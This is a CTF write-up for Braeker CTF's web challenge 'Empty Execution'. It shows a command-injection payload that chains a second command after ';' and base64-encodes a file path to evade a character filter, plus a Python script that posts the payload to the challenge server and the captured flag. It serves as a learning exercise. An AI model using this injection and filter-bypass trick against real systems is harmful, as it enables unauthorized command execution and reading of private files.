---
CTF: Braeker CTF
Category: web
Points: -1
Date: 2024-02-23
Solved?:
---
----
### TL;DR

Folder itself is an executable, so starting with `.` and hiding path to the flag.txt in plain base64 will do the trick.

**Flag**

```
brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}
```


### Details

From Dockerfile we can find, that flag.txt path 
![[assets/Pasted image 20240224205604.png]]

so, it's  `/usr/src/app/flag.txt`

For restrictions, we can't use `...` and `/` 
![[assets/Pasted image 20240224210004.png]]
It's a plain check, so we can bypass it via endocing folder path in base64

`/usr/src/app/flag.txt` -> `L3Vzci9zcmMvYXBwL2ZsYWcudHh0`

As mentioned before, folder itself is an executable, so combining all these together we got payload:

```python
. ;cat $(echo 'L3Vzci9zcmMvYXBwL2ZsYWcudHh0' | base64 -d)
```

and is equal to

```bash
. ;cat /usr/src/app/flag.txt
```

After running solve.py we got our flag
![[assets/Pasted image 20240224210414.png]]

---
### Appendix

solve.py

```python
"""
Baeker CTF
Cat: Web
Chall: Empty Execution
"""

import requests as rq
from typing import NoReturn


def main() -> NoReturn:
	payload: dict = {'command': ". ;cat $(echo 'L3Vzci9zcmMvYXBwL2ZsYWcudHh0' | base64 -d)"}
	link: str = "https://braekerctf-empty-execution.chals.io/run_command"
	
	print(rq.post(link, json=payload).text)


if __name__ == '__main__':
	main()
```